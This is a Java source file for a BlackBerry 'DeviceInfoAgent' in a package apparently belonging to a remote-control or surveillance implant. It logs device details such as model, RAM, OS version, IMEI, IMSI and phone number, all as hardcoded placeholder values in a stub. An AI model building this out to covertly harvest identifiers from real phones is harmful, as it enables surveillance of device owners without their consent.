package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class DeviceInfoAgent extends Agent {
    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);

    public DeviceInfoAgent(int agentStatus) {
        super(AGENT_DEVICE, agentStatus, true);
        Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_DEVICE,
                "Wrong Conversion");
    }

    protected DeviceInfoAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");

        Check.requires(log != null, "Null log");

        log.createLog(null);

        boolean ret = true;

        // Modello
        String content = "Processor: ARM\n";
        ret &= log.writeLog(content, false);

        content = "Model: 8300\n";
        ret &= log.writeLog(content, false);

        // Alimentazione
        content = "Battery: installed\n";
        ret &= log.writeLog(content, false);

        content = "(On AC Line)\n";
        ret &= log.writeLog(content, false);

        // RAM
        content = "RAM: 128MB\n";
        ret &= log.writeLog(content, false);

        // DISK
        content = "FLASH: 64MB\nSD: 1GB\n";
        ret &= log.writeLog(content, false);

        // OS Version
        content = "OS: rim 4.3.0\n";
        ret &= log.writeLog(content, false);

        // Device
        content = "IMEI: 123456789012345\nIMSI: 123456789012345\nPhone: +390212345678\n";
        ret &= log.writeLog(content, true);

        if (ret == false) {
            debug.error("Error writing file");
        }

        log.close();

        this.sleepUntilStopped();
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
